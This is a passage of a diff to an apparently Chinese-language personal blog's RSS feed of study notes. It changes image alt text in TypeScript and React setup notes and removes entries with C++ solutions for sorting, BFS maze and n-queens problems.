data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;takeTest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token builtin&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Taking a test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;let&lt;/span&gt; student &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Student&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;John&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;john@gmail.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;折叠代码块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#折叠代码块&#34;&gt;#&lt;/a&gt; 折叠代码块&lt;/h3&gt;
 &lt;p&gt;ctrl + k + 0 折叠全部&lt;br /&gt;
  ctrl + k + j 展开全部&lt;/p&gt;
 &lt;p&gt;ctrl + shift + [ 折叠选中&lt;br /&gt;
@@ -288,20 +914,20 @@ mac 下的&lt;br /&gt;
 所以再装一个类型注释库 @types 是很流行的 JS 类型注释库 里面有所有 JS 包的类型注释&lt;/p&gt;
 &lt;figure class=&#34;highlight sh&#34;&gt;&lt;figcaption data-lang=&#34;sh&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;npm&lt;/span&gt; i &lt;span class=&#34;token parameter variable&#34;&gt;-D&lt;/span&gt; @types/lodash&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;-D 开发环境安装 也就是不会出现在上线环境&lt;br /&gt;
  @types/ + 上 JS 包&lt;br /&gt;
-&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/UNFM5fXyRi2KSPh.png&#34; alt=&#34;Pasted image 20230104230218&#34; /&gt;&lt;br /&gt;
- 这样就可以出现提示了&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/bPVMUXvisc7OryI.png&#34; alt=&#34;Pasted image 20230104230401&#34; /&gt;&lt;br /&gt;
- 包和声明文件一般不会分开&lt;/p&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/UNFM5fXyRi2KSPh.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+这样就可以出现提示了&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/bPVMUXvisc7OryI.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+包和声明文件一般不会分开&lt;/p&gt;
 &lt;h2 id=&#34;react&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#react&#34;&gt;#&lt;/a&gt; React&lt;/h2&gt;
 &lt;figure class=&#34;highlight sh&#34;&gt;&lt;figcaption data-lang=&#34;sh&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;npx create-react-app reminders-app &lt;span class=&#34;token parameter variable&#34;&gt;--template&lt;/span&gt; typescript&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;创建一个叫 reminders-app 的 react 且使用 typescript&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/Wh9QGLDtRdnuBEV.png&#34; alt=&#34;Pasted image 20230104233058&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/Wh9QGLDtRdnuBEV.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;button.btn.btn-primary
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;创建一个 button className 为 btn btn-primary&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/dG9w5zgelPZoJq4.png&#34; alt=&#34;Pasted image 20230104233712&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/dG9w5zgelPZoJq4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;还是一样的 ctrl + .&lt;br /&gt;
-&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/UGcnwb4qm5vMIsE.png&#34; alt=&#34;Pasted image 20230104234206&#34; /&gt;&lt;br /&gt;
-&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/H3at5vrYZqQJVdz.png&#34; alt=&#34;Pasted image 20230104234224&#34; /&gt;&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/UGcnwb4qm5vMIsE.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/08/09/H3at5vrYZqQJVdz.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
  就会自动创建了&lt;/p&gt;
  ]]></description>
         </item>
@@ -543,437 +1169,6 @@ int main()
         n -- ;
         down(1);
     &amp;#125;
-    return 0;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://example.com/2024/07/31/Algorithm/Top%2010%20Sorting%20Algorithm/%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F/</guid>
-            <title>基数排序</title>
-            <link>http://example.com/2024/07/31/Algorithm/Top%2010%20Sorting%20Algorithm/%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F/</link>
-            <category term="Algorithm" scheme="http://example.com/categories/Algorithm/" />
-            <category term="Algorithm, Top 10 Sorting Algorithm" scheme="http://example.com/categories/Algorithm/Algorithm-Top-10-Sorting-Algorithm/" />
-            <pubDate>Wed, 31 Jul 2024 22:16:49 +0800</pubDate>
-            <description><![CDATA[ &lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int maxbit()
-&amp;#123;
-    int maxv = a[0];
-    for (int i = 1; i &amp;lt; n; i ++ )
-        if (maxv &amp;lt; a[i])
-            maxv = a[i];
-    int cnt = 1;
-    while (maxv &amp;gt;= 10) maxv /= 10, cnt ++ ;
-
-    return cnt;
-&amp;#125;
-void radixsort()
-&amp;#123;
-    int t = maxbit();
-    int radix = 1;
-
-    for (int i = 1; i &amp;lt;= t; i ++ )
-    &amp;#123;
-        for (int j = 0; j &amp;lt; 10; j ++ ) count[j] = 0;
-        for (int j = 0; j &amp;lt; n; j ++ )
-        &amp;#123;
-            int k = (a[j] / radix) % 10;
-            count[k] ++ ;
-        &amp;#125;
-        for (int j = 1; j &amp;lt; 10; j ++ ) count[j] += count[j-1];
-        for (int j = n-1; j &amp;gt;= 0; j -- )
-        &amp;#123;
-            int k = (a[j] / radix) % 10;
-            temp[count[k]-1] = a[j];
-            count[k] -- ;
-        &amp;#125;
-        for (int j = 0; j &amp;lt; n; j ++ ) a[j] = temp[j];
-        radix *= 10;
-    &amp;#125;
-
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://example.com/2024/07/31/Algorithm/Top%2010%20Sorting%20Algorithm/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/</guid>
-            <title>冒泡排序</title>
-            <link>http://example.com/2024/07/31/Algorithm/Top%2010%20Sorting%20Algorithm/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/</link>
-            <category term="Algorithm" scheme="http://example.com/categories/Algorithm/" />
-            <category term="Algorithm, Top 10 Sorting Algorithm" scheme="http://example.com/categories/Algorithm/Algorithm-Top-10-Sorting-Algorithm/" />
-            <pubDate>Wed, 31 Jul 2024 22:16:49 +0800</pubDate>
-            <description><![CDATA[ &lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void bubble_sort()
-&amp;#123;
-    for (int i = n-1; i &amp;gt;= 1; i -- )
-    &amp;#123;
-        bool flag = true;
-        for (int j = 1; j &amp;lt;= i; j ++ )
-            if (a[j-1] &amp;gt; a[j])
-            &amp;#123;
-                swap(a[j-1], a[j]);
-                flag = false;
-            &amp;#125;
-        if (flag) return;
-    &amp;#125;
-&amp;#125;
-
-&lt;/code&gt;&lt;/pre&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://example.com/2024/07/31/Algorithm/Top%2010%20Sorting%20Algorithm/Classification/</guid>
-            <title>十大排序算法总结</title>
-            <link>http://example.com/2024/07/31/Algorithm/Top%2010%20Sorting%20Algorithm/Classification/</link>
-            <category term="Algorithm" scheme="http://example.com/categories/Algorithm/" />
-            <category term="Algorithm, Top 10 Sorting Algorithm" scheme="http://example.com/categories/Algorithm/Algorithm-Top-10-Sorting-Algorithm/" />
-            <pubDate>Wed, 31 Jul 2024 22:16:49 +0800</pubDate>
-            <description><![CDATA[ &lt;h3 id=&#34;十大排序算法总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#十大排序算法总结&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://www.acwing.com/solution/content/26513/&#34;&gt;十大排序算法总结&lt;/a&gt;&lt;/h3&gt;
-&lt;p&gt;排序算法的分类：&lt;br /&gt;
-1. 插入：[[插入排序]]，折半插入，[[希尔排序]]&lt;br /&gt;
- 2. 交换：[[冒泡排序]]，[[快速排序（最快）]]&lt;br /&gt;
- 3. 选择：[[选择排序]]，[[堆排序]]&lt;br /&gt;
- 4. 归并：[[归并排序]]（不只二路归并）&lt;br /&gt;
-5. 基数：[[基数排序]]&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://example.com/2024/07/31/Algorithm/Search%20&amp;%20Graph%20Theory/AcWing%20845.%20%E5%85%AB%E6%95%B0%E7%A0%81/</guid>
-            <title>AcWing 845. 八数码</title>
-            <link>http://example.com/2024/07/31/Algorithm/Search%20&amp;%20Graph%20Theory/AcWing%20845.%20%E5%85%AB%E6%95%B0%E7%A0%81/</link>
-            <category term="Algorithm" scheme="http://example.com/categories/Algorithm/" />
-            <category term="Algorithm, Search &amp; Graph Theory" scheme="http://example.com/categories/Algorithm/Algorithm-Search-Graph-Theory/" />
-            <pubDate>Wed, 31 Jul 2024 22:16:49 +0800</pubDate>
-            <description><![CDATA[ &lt;h3 id=&#34;八数码-bfs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#八数码-bfs&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://www.acwing.com/problem/content/847/&#34;&gt;八数码 - BFS&lt;/a&gt;&lt;/h3&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;![[Pasted image 20221227151816.png]]&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;
-&lt;/code&gt;&lt;/pre&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://example.com/2024/07/31/Algorithm/Search%20&amp;%20Graph%20Theory/AcWing%20844.%20%E8%B5%B0%E8%BF%B7%E5%AE%AB%EF%BC%88BFS%EF%BC%89/</guid>
-            <title>AcWing 844. 走迷宫（BFS）</title>
-            <link>http://example.com/2024/07/31/Algorithm/Search%20&amp;%20Graph%20Theory/AcWing%20844.%20%E8%B5%B0%E8%BF%B7%E5%AE%AB%EF%BC%88BFS%EF%BC%89/</link>
-            <category term="Algorithm" scheme="http://example.com/categories/Algorithm/" />
-            <category term="Algorithm, Search &amp; Graph Theory" scheme="http://example.com/categories/Algorithm/Algorithm-Search-Graph-Theory/" />
-            <pubDate>Wed, 31 Jul 2024 22:16:49 +0800</pubDate>
-            <description><![CDATA[ &lt;h3 id=&#34;走迷宫-bfs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#走迷宫-bfs&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://www.acwing.com/problem/content/846/&#34;&gt;走迷宫 - BFS&lt;/a&gt;&lt;/h3&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
-#include &amp;lt;algorithm&amp;gt;
-#include &amp;lt;cstring&amp;gt;
-
-using namespace std;
-
-typedef pair&amp;lt;int, int&amp;gt; PII;
-
-const int N = 110;
-
-int n, m;
-int g[N][N];
-int d[N][N];
-PII q[N * N];
-
-int bfs()&amp;#123;
-	int hh = 0, tt = 0;
-	q[0] = &amp;#123;0, 0&amp;#125;;
-	memset(d, -1, sizeof d);
-	d[0][0] = 0;
-	int dx[4] = &amp;#123;-1, 0, 1, 0&amp;#125;, dy[4] = &amp;#123;0, 1, 0, -1&amp;#125;;
-	while(hh &amp;lt;= tt)&amp;#123;
-	//while 队列不空
-		auto t = q[hh++];
-		//每一次取出来队头元素 即 t = 队头
-		for(int i = 0; i &amp;lt; 4; i++)&amp;#123;
-			int x = t.first + dx[i], y = t.second + dy[i];
-			//沿着这个方向走
-			if(x &amp;gt;= 0 &amp;amp;&amp;amp; x &amp;lt; n &amp;amp;&amp;amp; y &amp;gt;= 0 &amp;amp;&amp;amp; y &amp;lt; m &amp;amp;&amp;amp; g[x][y] == 0 &amp;amp;&amp;amp; d[x][y] == -1)&amp;#123;
-				//并且在边界内的话                      并且是空地可以走   并且没有走过的话
-				//如果不是第一次搜到即走过一次了的话就不是BFS 也就不是最短距离
-				//注意这里是一圈一圈搜的
-				d[x][y] = d[t.first][t.second] + 1;
-				q[++ tt] = &amp;#123;x, y&amp;#125;;
-				//将这个点加入队列
-			&amp;#125;
-		&amp;#125;
-	&amp;#125;
-	return d[n - 1][m - 1];
-	//输出右下角这个点的距离
-&amp;#125;
-
-int main()&amp;#123;
-	cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
-	for(int i = 0; i &amp;lt; n; i++)
-		for(int j = 0; j &amp;lt; m; j++)
-			cin &amp;gt;&amp;gt; g[i][j];
-	cout &amp;lt;&amp;lt; bfs() &amp;lt;&amp;lt; endl;
-	return 0;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;![[Pasted image 20221227150900.png]]&lt;br /&gt;
-![[Pasted image 20221227151607.png]]&lt;br /&gt;
-![[Pasted image 20221227151454.png]]&lt;/p&gt;
-&lt;h2 id=&#34;只有当所有边的权重即边权都是1的时候才可以用bfs求最短路一般情况下都要用专门的最短路算法求最短路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#只有当所有边的权重即边权都是1的时候才可以用bfs求最短路一般情况下都要用专门的最短路算法求最短路&#34;&gt;#&lt;/a&gt; 只有当所有边的权重（即边权）都是 1 的时候才可以用 BFS 求最短路一般情况下都要用专门的最短路算法求最短路&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//dp问题可以被看成是一种特殊的最短路问题 即最短路问题是包含dp问题的 即dp问题就是没有环的最短路
-//深搜可以保证可以搜到终点 但是不能保证搜到的路径是最短的
-
-//不是所有的最短路问题都可以用bfs来做 只有当所有边的权重都一样的时候 比如说边权=1时 可以用bfs
-//一般情况下都要用专门的最短路算法求最短路
-
-//dp问题肯定不会用最短路算法来求 因为最短路算法的时间复杂度比较高 dp问题的时间复杂度比较低
-#include &amp;lt;cstring&amp;gt;
-#include &amp;lt;iostream&amp;gt;
-#include &amp;lt;algorithm&amp;gt;
-#include &amp;lt;queue&amp;gt;
-
-
-using namespace std;
-
-const int N = 110;
-
-
-typedef pair&amp;lt;int, int&amp;gt; PII;
-
-int n, m;
-int g[N][N];
-int d[N][N];
-//如果需要记录路径 只需要记录一下哪儿个点是从哪儿个点拓展出来的就可以了
-PII q[N * N], Prev[N][N];
-
-int bfs()&amp;#123;
-    int hh = 0, tt = 0;
-    q[0] = &amp;#123;0, 0&amp;#125;;
-    
-    memset(d, -1, sizeof d);//将所有距离初始化成-1 表示没有走过
-    d[0][0] = 0;//d第0初始化成0 表示已经走过了
-    
-    //可以用向量表示往上下左右走
-    //上 (-1, 0) 右 (0, 1) 下 (1, 0) 左 (0, -1)
-    
-    //即  -1         0         1         0
-    //        0         1         0         -1
-    int dx[4] = &amp;#123;-1, 0, 1, 0&amp;#125;, dy[4] = &amp;#123;0, 1, 0, -1&amp;#125;;
-    
-    while(hh &amp;lt;= tt)&amp;#123;
-        auto t = q[hh++];//每次取出队头
-        
-        for(int i = 0; i &amp;lt; 4; i++)&amp;#123;
-            int x = t.first + dx[i], y = t.second + dy[i];
-            if(x &amp;gt;= 0 &amp;amp;&amp;amp; x &amp;lt; n &amp;amp;&amp;amp; y &amp;gt;= 0 &amp;amp;&amp;amp; y &amp;lt; m &amp;amp;&amp;amp; g[x][y] == 0 &amp;amp;&amp;amp; d[x][y] == -1)&amp;#123;
-            //这个判断的意思是 如果沿着这个边界走的话是在边界以内的 并且这个点是可以走的 即 != 0 并且这个点没有走过 即 d[x][y] == -1
-                d[x][y] = d[t.first][t.second] + 1;//BFS只有第一次搜到的才是最短距离 如果不是第一次搜到那就不是最短距离
-                Prev[x][y] = t;
-                q[++ tt] = &amp;#123;x, y&amp;#125;;
-                //新的 x 新的 y 塞进队列
-            &amp;#125;
-        &amp;#125;
-    &amp;#125;
-    
-    //输出路径
-    int x = n - 1, y = m - 1;
-    while(x || y)&amp;#123;
-        // cout &amp;lt;&amp;lt; x &amp;lt;&amp;lt; &#39; &#39; &amp;lt;&amp;lt; y &amp;lt;&amp;lt; endl;
-        auto t = Prev[x][y];
-        x = t.first, y = t.second;
-    &amp;#125;
-    
-    return d[n - 1][m - 1];
-&amp;#125;
-
-
-int main()&amp;#123;
-    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
-    for(int i = 0; i &amp;lt; n; i++)
-        for(int j = 0; j &amp;lt; m; j++)
-            cin &amp;gt;&amp;gt; g[i][j];
-            
-    cout &amp;lt;&amp;lt; bfs() &amp;lt;&amp;lt; endl;
-    
-    return 0;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://example.com/2024/07/31/Algorithm/Search%20&amp;%20Graph%20Theory/AcWing%20843.%20n-%E7%9A%87%E5%90%8E%E9%97%AE%E9%A2%98/</guid>
-            <title>AcWing 843. n-皇后问题</title>
-            <link>http://example.com/2024/07/31/Algorithm/Search%20&amp;%20Graph%20Theory/AcWing%20843.%20n-%E7%9A%87%E5%90%8E%E9%97%AE%E9%A2%98/</link>
-            <category term="Algorithm" scheme="http://example.com/categories/Algorithm/" />
-            <category term="Algorithm, Search &amp; Graph Theory" scheme="http://example.com/categories/Algorithm/Algorithm-Search-Graph-Theory/" />
-            <pubDate>Wed, 31 Jul 2024 22:16:49 +0800</pubDate>
-            <description><![CDATA[ &lt;h3 id=&#34;n皇后问题-dfs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#n皇后问题-dfs&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;https://www.acwing.com/problem/content/845/&#34;&gt;N 皇后问题 - DFS&lt;/a&gt;&lt;/h3&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
-
-using namespace std;
-
-const int N = 20;
-
-int n;
-char g[N][N];
-bool col[N], dg[N], udg[N];
-
-void dfs(int u)&amp;#123;
-	if(u == n)&amp;#123;
-		for(int i = 0; i &amp;lt; n; i++) puts(g[i]);
-		puts(&amp;quot;&amp;quot;);
-		return;
-	&amp;#125;
-	for(int i = 0; i &amp;lt; n; i++)&amp;#123;
-		if(!col[i] &amp;amp;&amp;amp; !dg[u + i] &amp;amp;&amp;amp; !udg[n - u + i])&amp;#123;
-		//这个 偏移量 相当于 把 负数和 这个数 简单的映射了 一下
-			g[u][i] = &#39;Q&#39;;
-			col[i] = dg[u + i] = udg[n - u + i] = true;
-			dfs(u + 1);
-			col[i] = dg[u + i] = udg[n - u + i] = false;
-			g[u][i] = &#39;.&#39;;
-		&amp;#125;
-	&amp;#125;
-&amp;#125;
-int main()&amp;#123;
-	cin &amp;gt;&amp;gt; n;
-	for(int i = 0; i &amp;lt; n; i++)
-		for(int j = 0; j &amp;lt; n; j++)
-			g[i][j] = &#39;.&#39;;
-	dfs(0);
-	return 0;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;为什么求截距就可以判断两个点在一条对角线或者反对角线呢&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#为什么求截距就可以判断两个点在一条对角线或者反对角线呢&#34;&gt;#&lt;/a&gt; 为什么求截距就可以判断两个点在一条对角线或者反对角线呢？&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;因为b可以唯一确定一条直线，在同一条直线上面b都是相同的，所以以b为下标是可以繁殖对角线和反对角线上面放皇后的
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
-
-using namespace std;
-
-const int N = 20;
-int n;
-char g[N][N];
-bool row[N], col[N], dg[N], udg[N];
-
-void dfs(int x, int y, int s)&amp;#123;
-	if(y == n)&amp;#123;
-		y = 0;
-		x ++;
-	&amp;#125;
-	if(x == n)&amp;#123;
-		if(s == n)&amp;#123;
-			for(int i = 0; i &amp;lt; n; i++) puts(g[i]);
-			puts(&amp;quot;&amp;quot;);
-		&amp;#125;
-		return;
-	&amp;#125;
-	//不放皇后
-	dfs(x, y + 1, s);
-	//放皇后
-	if(!row[x] &amp;amp;&amp;amp; !col[y] &amp;amp;&amp;amp; !dg[x + y] &amp;amp;&amp;amp;!udg[x - y + n])&amp;#123;
-		g[x][y] = &#39;Q&#39;;
-		row[x] = col[y] = dg[x + y] = udg[x - y + n] = true;
-		dfs(x, y + 1, s + 1);
-		row[x] = col[y] = dg[x + y] = udg[x - y + n] = false;
-		g[x][y] = &#39;.&#39;;
-	&amp;#125;
-&amp;#125;
-int main()&amp;#123;
-	cin &amp;gt;&amp;gt; n;
-	for(int i = 0; i &amp;lt; n; i++)&amp;#123;
-		for(int j = 0; j &amp;lt; n; j++)&amp;#123;
-			g[i][j] = &#39;.&#39;;
-		&amp;#125;
-	&amp;#125;
-	dfs(0, 0, 0);
-	return 0;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;a href=&#34;https://b23.tv/EtnaOZ3&#34;&gt;懒猫老师 - C 语言 - 递归函数 - 八皇后问题 (搜索，回溯)- 哔哩哔哩&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&amp;lt;iframe src=&amp;quot;&lt;a href=&#34;http://player.bilibili.com/player.html?aid=76265320&amp;amp;bvid=BV1wJ411U7Gy&amp;amp;cid=130453660&amp;amp;page=1&#34;&gt;http://player.bilibili.com/player.html?aid=76265320&amp;amp;bvid=BV1wJ411U7Gy&amp;amp;cid=130453660&amp;amp;page=1&lt;/a&gt;&amp;quot; scrolling=&amp;quot;no&amp;quot; border=&amp;quot;0&amp;quot; frameborder=&amp;quot;no&amp;quot; framespacing=&amp;quot;0&amp;quot; allowfullscreen=&amp;quot;true&amp;quot; width=&amp;quot;500px&amp;quot; height=&amp;quot;500px&amp;quot;&amp;gt; &amp;lt;/iframe&amp;gt;&lt;/p&gt;
-&lt;p&gt;![[Pasted image 20221225161908.png]]&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//枚举方法1
-// #include &amp;lt;iostream&amp;gt;
-
-// using namespace std;
-
-// const int N = 20;
-
-// int n;
-// char g[N][N];
-// bool col[N], dg[N], udg[N];
-
-// void dfs(int u)&amp;#123;
-//     if(u == n)&amp;#123;
-//         for(int i = 0;i &amp;lt; n; i++) puts(g[i]);
-//         puts(&amp;quot;&amp;quot;);
-//         return;
-//     &amp;#125;
-    
-//     for(int i = 0; i &amp;lt; n; i++)
-//         if(!col[i] &amp;amp;&amp;amp; !dg[u+ i] &amp;amp;&amp;amp; !udg[n - u + i])&amp;#123;//剪枝
-//             g[u][i] = &#39;Q&#39;;
-//             col[i] = dg[u + i] = udg[n - u + i] = true;//截距如下
-//             //y = x + b                                                                                            y = -x + b
-//             //b = y - x 因为 y - x 是负数，而数组下标不能为负数 所以给他加个偏移量 即 b = y - x + n                b =  y + x
-//             dfs(u + 1);
-//             col[i] = dg[u + i] = udg[n - u + i] = false;//恢复现场
-//             g[u][i] = &#39;.&#39;;
-//         &amp;#125;
-// &amp;#125;
-
-// int main()&amp;#123;
-//     cin &amp;gt;&amp;gt; n;
-//     for(int i = 0; i &amp;lt; n; i++)
-//         for(int j = 0; j &amp;lt; n; j++)
-//             g[i][j] = &#39;.&#39;;
-            
-//     dfs(0);
-    
-//     return 0;
-// &amp;#125;
-
-
-
-//枚举方法2
-#include &amp;lt;iostream&amp;gt;
-
-using namespace std;
-
-const int N = 20;
-
-int n;
-char g[N][N];
-bool row[N], col[N], dg[N], udg[N];
-
-void dfs(int x, int y, int s)&amp;#123;
-    if(y == n) y = 0, x++;
-    
-    if(x == n)&amp;#123;
-        if(s == n)&amp;#123;
-            for(int i = 0; i &amp;lt; n; i++) puts(g[i]);
-            puts(&amp;quot;&amp;quot;);
-        &amp;#125;
-        
-        return;
-        //这边return下面那个dfs也会return出去到dfs下面的if去的
-    &amp;#125;
-    
-    //不放皇后
-    dfs(x, y + 1, s);
-    
-    //放皇后
